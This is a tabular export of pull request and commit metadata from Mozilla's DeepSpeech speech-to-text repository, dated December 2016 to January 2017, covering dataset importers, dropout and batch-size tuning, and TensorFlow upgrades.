4057,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d4dcd312cefcb053cc163a6e81cdb33a0e62e63f,Update Fisher importer to the new next_batch API
4058,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33c9521a6f8b731c0a67a6a2147d12e83f7ec139,Add validation and cleanup function to util/text.py
4059,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ef07ce7d0bf8ebd90d2be93463a290347efb16e,Adapt Fisher importer to other importer API changes
4060,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5c9fd0cb3aab41ed74a37f281d71d296e671424d,Add environment variable to control logging of variables and gradients
4061,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64724815e7b2b343f25f235b27d9afb634610e49,Remove unneeded check from _maybe_split_wav
4062,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5dc2e98c8ff2d7ad33d5265a4db867eb2b81468c,Add code to manually fix broken transcript
4063,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53f76b30f8e07eee8b80c6ad0e144558db1cdaf3,Add bin/run-fisher.sh script for training with Fisher
4064,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fc818b87ac2aef49c52ec348a4cc64592445c1a,Remove unnecessary file existence check and comment
4065,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ec590bd40b8baa7f92b21066861999fbda645829,Remove ds_dataset_path export from run-fisher.sh
4066,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bc8b046605328a2577d8093bbb7eb9f0625261a9,"Merge pull request #84 from mozilla/issue3_fisher

Implement Fisher corpus importer"
4067,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32a436309e0cf7c030e98ecba386566c575dfd2e,Switchboard importer
4068,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,501783501dd7d85e7244e745611fe5f0b377ae68,Switchboard importer
4069,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c92f98669024c7205eb631ba3b70c055f862dfad,Switchboard importer
4070,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3cbb29ee319061401c44d8ea9141db8ea65298df,deleted swb
4071,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e7d3a725aecb2d0fe9e7d0e26cddc094cebeb9b,Fixing reviewer comments
4072,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8ff6fcc64db4e94132c14166a2b62ec9901c6f9,Adding script to run swb
4073,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d540a05c0911637277e81d4ddf1eb5c4a659e210,"Merge pull request #121 from andrenatal/swb_wip

Switchboard importer"
4074,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96d6283d087aa9cb23125380640b3e4e7331ce7d,Add documentation for log_variables
4075,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e06944802868b5127a69d89fc6c5ecb6ccfe58c9,Change Python2 version in notebook metadata to fix merge conflict
4076,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f580138b267c3523d446de270a13a215d06c370f,"Merge pull request #316 from mozilla/issue306

Add environment variable to control logging of variables and gradients"
4077,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ddd5e4bcf79d732b9c17c48f1bd4c6a3aa264a98,Fix #331; Hide parameter menu bar entry in case of no parameter charts
4078,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,224299d7cf75c19baddde98c23a6806960705145,"Merge pull request #334 from mozilla/issue331

Fix #331; Hide parameter menu bar entry in case of no parameter charts"
4079,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dffaa95a235afcc489dff6427994323937190b52,Fix #336
4080,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12e3ca11524be609462e797bf7c2645d4805313f,"Merge pull request #337 from mozilla/issue336

Fix #336"
4081,https://api.github.com/repos/mozilla/DeepSpeech/pulls/337,337,Fix #336,,kdavis-mozilla,12054740,2017-01-07T08:32:14Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dffaa95a235afcc489dff6427994323937190b52,Fix #336
4082,https://api.github.com/repos/mozilla/DeepSpeech/pulls/334,334,Fix #331; Hide parameter menu bar entry in case of no parameter charts,,tilmankamp,5991088,2017-01-05T15:34:51Z,CONTRIBUTOR,True,6,12,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ddd5e4bcf79d732b9c17c48f1bd4c6a3aa264a98,Fix #331; Hide parameter menu bar entry in case of no parameter charts
4083,https://api.github.com/repos/mozilla/DeepSpeech/pulls/329,329,Fix #313; Decomposed Python notebook,,tilmankamp,5991088,2017-01-03T13:44:15Z,CONTRIBUTOR,False,2864,2010,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aff96f5bff451c548ee66b81848f7a2f1c6c9d3f,Fix #313; Decomposed Python notebook
4084,https://api.github.com/repos/mozilla/DeepSpeech/pulls/329,329,Fix #313; Decomposed Python notebook,,tilmankamp,5991088,2017-01-03T13:44:15Z,CONTRIBUTOR,False,2864,2010,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3094714fdc62bb4c318339a5d5974e3170bd14fa,Math support for markdown documents
4085,https://api.github.com/repos/mozilla/DeepSpeech/pulls/327,327,Increase of dropout,,kdavis-mozilla,12054740,2016-12-29T14:51:51Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f2a1df681aee83c9e9c71b6760906645204275a8,Fix #325 (Dropout too low)
4086,https://api.github.com/repos/mozilla/DeepSpeech/pulls/327,327,Increase of dropout,,kdavis-mozilla,12054740,2016-12-29T14:51:51Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,026b18c9e43c481d463c624d850d101f238b0ed8,"Merge pull request #326 from mozilla/issue325

Fix #325 (Dropout too low)"
4087,https://api.github.com/repos/mozilla/DeepSpeech/pulls/326,326,Fix #325 (Dropout too low),,kdavis-mozilla,12054740,2016-12-29T14:47:51Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f2a1df681aee83c9e9c71b6760906645204275a8,Fix #325 (Dropout too low)
4088,https://api.github.com/repos/mozilla/DeepSpeech/pulls/324,324,Upgraded for tf0.12,"* Modified main notebook file to be in line with 0.12 changes
* Modified utils/text to use concat_v2 and stack to be in line with 0.12 changes
* Updated main notebook file variable scope issue",kentsommer,4055025,2016-12-26T05:06:02Z,NONE,False,47,44,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a42f68638c92b42c4ac09097d76f5aaa18ab511a,Upgraded for tf0.12
4089,https://api.github.com/repos/mozilla/DeepSpeech/pulls/324,324,Upgraded for tf0.12,"* Modified main notebook file to be in line with 0.12 changes
* Modified utils/text to use concat_v2 and stack to be in line with 0.12 changes
* Updated main notebook file variable scope issue",kentsommer,4055025,2016-12-26T05:06:02Z,NONE,False,47,44,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d25c1bc584af25c6e607abe8e69dda122e07bc0,"Fix variable scope, fix deprecated all_variables

Changes to match @lissyx"
4090,https://api.github.com/repos/mozilla/DeepSpeech/pulls/323,323,Decreased batch sizes,,kdavis-mozilla,12054740,2016-12-24T07:09:07Z,CONTRIBUTOR,True,6,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7492eb2f8cdbcffbd55168d0ce5c4237b9635f4d,Decreased batch sizes
4091,https://api.github.com/repos/mozilla/DeepSpeech/pulls/323,323,Decreased batch sizes,,kdavis-mozilla,12054740,2016-12-24T07:09:07Z,CONTRIBUTOR,True,6,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3533852884f83161438f2c3870e4013d49a55683,Decreased batch sizes
4092,https://api.github.com/repos/mozilla/DeepSpeech/pulls/323,323,Decreased batch sizes,,kdavis-mozilla,12054740,2016-12-24T07:09:07Z,CONTRIBUTOR,True,6,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2abd329c3b51bc330a28f8a544a3617cf69b39f,"Merge pull request #322 from mozilla/issue321

Issue321"
4093,https://api.github.com/repos/mozilla/DeepSpeech/pulls/322,322,Issue321,Decreased batch sizes,kdavis-mozilla,12054740,2016-12-24T07:07:56Z,CONTRIBUTOR,True,6,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7492eb2f8cdbcffbd55168d0ce5c4237b9635f4d,Decreased batch sizes
4094,https://api.github.com/repos/mozilla/DeepSpeech/pulls/322,322,Issue321,Decreased batch sizes,kdavis-mozilla,12054740,2016-12-24T07:07:56Z,CONTRIBUTOR,True,6,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3533852884f83161438f2c3870e4013d49a55683,Decreased batch sizes
4095,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae7d559c8e99f55921bd2d366c8680313c562de2,"Validation and training WER labels are mis-reported

Fixes #278"
4096,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f05a2f16a151a2be72b6e141b580628f9f976f78,"Merge pull request #279 from lissyx/issue278

Validation and training WER labels are mis-reported"
4097,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9213a7c1836f94c83f5068fbb98c90cb35702641,Fix #225; Added descriptions and links to WER charts
4098,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b60a55635e4a8299ae78d4e7e40254dba9c5c199,Fixed #282
4099,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0115d8da7d75f2af535fba099efe0e2e6e558779,Defautl to 10
4100,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,35896ea6ae9b5be9fdef403d1e903bfc768a9d9e,"Merge pull request #283 from mozilla/issue282

Issue282"
4101,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7cc75f252f77a85dd895ccfe8256ba455a9c3482,"Merge pull request #280 from mozilla/issue225

Fix #225; Added descriptions and links to WER charts"
4102,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ffc638171e7215773f17c9585013f9d3f5d3fc6,Fix #253; Set state_is_tuple=True on BasicLSTMCell
4103,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17eb42cc58100b3d3030b35da22f4e5bf820a175,Update README to mention run-ldc93s1.sh and be more explicit about GPU requirements
4104,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8e99eeffddcb2ca00bc77f7a0f6cd9fa5873bbde,Fix #284; BiRNN with stride 2
4105,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c32932fb5ea0133adae247675a0934334ae71c5a,Fix #298; Added global time measurement
4106,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc207ee212bcbb5fd1883120430a7cffaa79ee31,"Merge pull request #299 from mozilla/issue298

Fix #298; Added global time measurement"
4107,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4097be941ab31ba80c95406dd946fce486863ad5,Focus on the notebook instead of the bin/ scripts on the README.
4108,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da562891020bf311ca551e0f2659c94680f87fea,"Merge pull request #271 from mozilla/issue264_readme

Update README.me to mention run-ldc93s1.sh and be more explicit about GPU requirements"
4109,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c10908a581e996c2f3cb64229d0e3167c379d76,Fix #304; Environment variable for device placement logs
4110,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,22695a985200d9d533fdd542f3ef4bca7a05a5e1,"Merge pull request #305 from mozilla/issue304

Fix #304; Environment variable for device placement logs"
4111,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,965806184085cb78f033b7769072fc8928b8eb2f,Fixed #309
4112,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,589ac1b1b21bbcedc5d199ce3e84a32237387825,"Merge pull request #310 from mozilla/issue309

Fixed #309"
4113,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e42504b29ba2d3f4fefd6f722815f49c86e5ca6,Now refers to pre-installed virtual environment
4114,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cf496df4cf367d13e090f5a6240818383e3d1b9d,"Merge pull request #254 from mozilla/issue253

Fix #253; Set state_is_tuple=True on BasicLSTMCell"
4115,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,91d3856f8b4ea73b83133f45fdbded8acff37a6c,"Merge pull request #301 from mozilla/issue284

Fix #284; BiRNN with stride 2"
4116,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b75142878d67d24cc9fffcddc4a18209371abccc,"Merge pull request #317 from mozilla/issue312

Switch to pre-installed virtual environment"
4117,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a6ef80278034ee995792e0d61638b677edb89679,Fixed #311 Increased model capacity
4118,https://api.github.com/repos/mozilla/DeepSpeech/pulls/320,320,Various updates,,kdavis-mozilla,12054740,2016-12-23T17:19:58Z,CONTRIBUTOR,True,58,36,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd10867a915f52a6e41c41663e4e318c61220649,"Merge pull request #318 from mozilla/issue311

Issue311"
4119,https://api.github.com/repos/mozilla/DeepSpeech/pulls/318,318,Issue311,"In the Deep Speech paper[[1](https://arxiv.org/abs/1412.5567)] the corpus they use that's most similar to TED is Switchboard (SWB). In section 5.1 paragraph 6 they describe the geometry they used when training on the SWB corpus:

<img width=""616"" alt=""modelgeometry"" src=""https://cloud.githubusercontent.com/assets/12054740/21456028/31cf1a72-c925-11e6-9635-be5ea2b99a3c.png"">

This commit updates our geometry accordingly.

In addition, in accord with the geometry changes, the default standard deviations were adjusted in approximate accord with Glorot and Bengio[[2](http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.207.2059)].",kdavis-mozilla,12054740,2016-12-23T14:36:42Z,CONTRIBUTOR,True,17,14,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a6ef80278034ee995792e0d61638b677edb89679,Fixed #311 Increased model capacity
4120,https://api.github.com/repos/mozilla/DeepSpeech/pulls/317,317,Switch to pre-installed virtual environment,,kdavis-mozilla,12054740,2016-12-23T09:10:10Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e42504b29ba2d3f4fefd6f722815f49c86e5ca6,Now refers to pre-installed virtual environment
4121,https://api.github.com/repos/mozilla/DeepSpeech/pulls/316,316,Add environment variable to control logging of variables and gradients,I had to do a bit of refactoring to make the code that extracts the results from the session.run call easier to read.,reuben,477142,2016-12-22T17:51:10Z,MEMBER,True,24,16,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5c9fd0cb3aab41ed74a37f281d71d296e671424d,Add environment variable to control logging of variables and gradients
4122,https://api.github.com/repos/mozilla/DeepSpeech/pulls/316,316,Add environment variable to control logging of variables and gradients,I had to do a bit of refactoring to make the code that extracts the results from the session.run call easier to read.,reuben,477142,2016-12-22T17:51:10Z,MEMBER,True,24,16,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96d6283d087aa9cb23125380640b3e4e7331ce7d,Add documentation for log_variables
4123,https://api.github.com/repos/mozilla/DeepSpeech/pulls/316,316,Add environment variable to control logging of variables and gradients,I had to do a bit of refactoring to make the code that extracts the results from the session.run call easier to read.,reuben,477142,2016-12-22T17:51:10Z,MEMBER,True,24,16,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e06944802868b5127a69d89fc6c5ecb6ccfe58c9,Change Python2 version in notebook metadata to fix merge conflict
4124,https://api.github.com/repos/mozilla/DeepSpeech/pulls/315,315,Fix #314; Added environment variable for stride length,,tilmankamp,5991088,2016-12-22T15:37:09Z,CONTRIBUTOR,False,38,31,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7fe83847a423b5ee36e45180c311d573abdb4c0d,Fix #314; Added environment variable for stride length
